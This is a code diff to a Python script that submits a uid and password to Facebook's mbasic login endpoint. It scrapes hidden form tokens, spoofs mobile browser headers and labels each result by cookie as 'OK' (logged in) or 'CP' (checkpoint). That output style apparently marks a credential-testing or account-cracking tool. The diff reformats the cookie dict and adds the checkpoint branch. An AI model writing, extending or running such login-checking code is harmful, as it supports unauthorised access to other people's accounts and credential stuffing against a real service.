@@ -24,13 +24,7 @@ datr = requu12.cookies.get('datr')
 sb = requu12.cookies.get('sb')
 fr = requu12.cookies.get('fr')
 data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
-cookies = {
-    "datr": datr,
-    "sb": sb,
-    "m_pixel_ratio": "2.75",
-    "wd": "393x851",
-    "fr": fr,
-}
+cookies ={"datr": datr, "sb": sb, "m_pixel_ratio": "2.75", "wd": "393x851", "fr": fr}
 url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
 headers = {
     "User-Agent": "Mozilla/5.0 (Linux; Android 12; M2010J19SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
@@ -60,3 +54,5 @@ print(data)
 log_cookies = Session.cookies.get_dict().keys()
 if "c_user" in log_cookies:
     print('\033[1;92m OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK OK ')
+elif 'checkpoint' in log_cookies:
+    print('\033[1;92m CP CP  CP CP CP CP CP CP CP CP CP CP CP CP CP CP CP CP CP CP CP CP CP CP CP CP')
